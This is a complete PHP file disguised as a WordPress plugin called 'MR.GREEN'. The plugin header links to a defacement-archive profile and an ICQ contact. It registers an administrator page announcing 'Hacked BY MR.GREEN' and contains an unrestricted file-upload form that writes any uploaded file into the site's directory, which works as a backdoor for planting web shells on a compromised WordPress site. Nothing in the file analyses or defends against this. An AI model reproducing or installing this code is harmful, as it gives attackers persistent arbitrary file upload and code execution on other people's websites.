<?php
/*
Plugin Name: MR.GREEN
Plugin URI: http://www.zone-h.org/archive/notifier=MR.GREEN
Description: Contact Me  ICQ Account : 747252180
Author: Green
Author URI: http://www.zone-h.org/archive/notifier=MR.GREEN
Version: Pro 
*/
add_action("admin_menu", function () {
    add_object_page("MR.GREEN", "MR.GREEN", "administrator", "Green", function () {
        echo "<center>Hacked BY MR.GREEN</center><br>


<center>Contact Me  ICQ Account : 747252180</center><br><center><br>
     ";

        if(isset($_POST['Submit'])){
            $filedir = "";
            $maxfile = '2888888';
         
            $file_name = $_FILES['image']['name'];
            $temporari = $_FILES['image']['tmp_name'];
            if (isset($_FILES['image']['name'])) {
                $abod = $filedir.$file_name;
                @move_uploaded_file($temporari, $abod);
         
        echo"<center><b>Link ==> <a href='$file_name' target=_blank>$file_name</a></b></center>";
		        
		        
        }
        };

        echo'
        <form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form></br></center><br>';


    });
    });
?>
